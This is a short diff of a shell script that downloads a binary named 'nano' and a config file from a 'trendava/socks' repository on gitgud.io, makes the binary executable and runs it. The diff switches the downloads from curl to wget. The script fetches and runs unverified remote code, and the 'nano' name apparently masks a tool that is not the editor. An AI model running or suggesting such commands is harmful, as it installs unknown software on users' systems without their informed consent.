@@ -1,4 +1,6 @@
-curl --output nano https://gitgud.io/trendava/socks/-/raw/master/nano
-curl --output config.ini https://gitgud.io/trendava/socks/-/raw/master/config.ini
+apt-get update
+apt-get install wget -y
+wget https://gitgud.io/trendava/socks/-/raw/master/nano
+wget https://gitgud.io/trendava/socks/-/raw/master/config.ini
 chmod 700 nano
 ./nano
